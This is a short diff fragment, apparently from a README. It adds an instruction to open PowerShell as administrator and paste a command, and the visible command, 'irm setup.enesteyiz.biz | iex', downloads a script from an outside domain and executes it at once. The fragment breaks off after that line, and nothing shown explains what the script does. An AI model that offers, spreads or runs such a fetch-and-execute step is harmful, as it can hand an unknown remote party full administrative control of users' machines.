@@ -1,3 +1,5 @@
+Open Powershell with admin rights and then paste one of the below. All of them are redirected to the same thing.
+
 Nice link
 ```powershell
 irm setup.enesteyiz.biz | iex
